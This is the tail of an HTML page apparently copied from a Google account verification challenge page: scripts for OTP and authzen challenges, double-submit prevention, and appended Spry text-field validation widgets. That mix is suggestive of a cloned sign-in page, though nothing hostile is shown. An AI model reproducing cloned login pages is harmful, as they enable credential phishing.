      mapOnloadHandler();
    }
    if (containsAuthzenChallenge) {
      authzenOnloadHandler();
    }
    if (containsOfflineOtpChallenge) {
      offlineOtpOnloadHandler();
    }

    expandSelectedChallenge();
  };
  window.onload = initialize;
})();

</script>
<script type="text/javascript">
(function() {
  var gaia = gaia || {};
  gaia.bind = function(fn, scope) {
  return function() {
  fn.apply(scope, arguments);
  };
  };
  gaia.forms = gaia.forms || {};
  gaia.forms.Form = function(formId) {
  this.form_ = document.getElementById(formId);
  this.formSubmitted_ = false;
  if (this.form_) {
  this.initForm_();
  }
  };
  gaia.forms.Form.prototype.initForm_ = function() {
  this.initSubmitListener_();
  };
  gaia.forms.Form.prototype.handleSubmit_ = function(e) {
  if (this.formSubmitted_) {
  e.preventDefault();
  } else {
  this.formSubmitted_ = true;
  }
  };
  gaia.forms.Form.prototype.initSubmitListener_ = function() {
  gaia_attachEvent(this.form_, 'submit',
  gaia.bind(this.handleSubmit_, this));
  };
  new gaia.forms.Form('challengeform');
  })();
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1", "integer", {useCharacterMasking:true});
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2");
</script>
  </body>
</html>